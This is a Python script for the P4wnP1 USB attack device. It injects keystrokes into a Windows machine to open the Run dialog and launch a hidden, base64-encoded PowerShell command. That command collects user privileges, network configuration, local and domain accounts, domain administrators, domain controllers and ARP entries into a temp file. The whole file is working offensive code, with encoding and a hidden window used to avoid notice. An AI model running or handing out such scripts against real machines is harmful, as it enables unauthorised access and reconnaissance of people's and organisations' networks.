#!/usr/bin/env python3
import os, sys, time, base64

P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

def ps_b64(cmd: str) -> str:
    import base64
    return base64.b64encode(cmd.encode("utf-16le")).decode()

def main():
    # one-liner: run several commands, append banners, save to TEMP, show in Notepad
    ps = r"""
$o = Join-Path $env:TEMP 'p4w_enum.txt';
$cmds = @(
  'whoami /all',
  'hostname',
  'ipconfig /all',
  'net user',
  'net group "domain admins" /domain',
  'nltest /dclist',
  'net view /domain',
  'net use',
  'arp -a'
);
Remove-Item $o -ErrorAction SilentlyContinue;
foreach($c in $cmds){
  Add-Content -Path $o -Value "`n===== $c =====";
  $r = cmd /c $c;
  Add-Content -Path $o -Value $r;
}
Start-Process notepad $o
"""
    b64 = ps_b64(ps)
    print("[*] Running recon, saving to %TEMP%\\p4w_enum.txt")

    win_r(); time.sleep(0.35)
    type_string(f"powershell -NoP -W Hidden -Enc {b64}\n", rdelay=0.02)
    print("[*] Recon launched.")

if __name__ == "__main__":
    main()
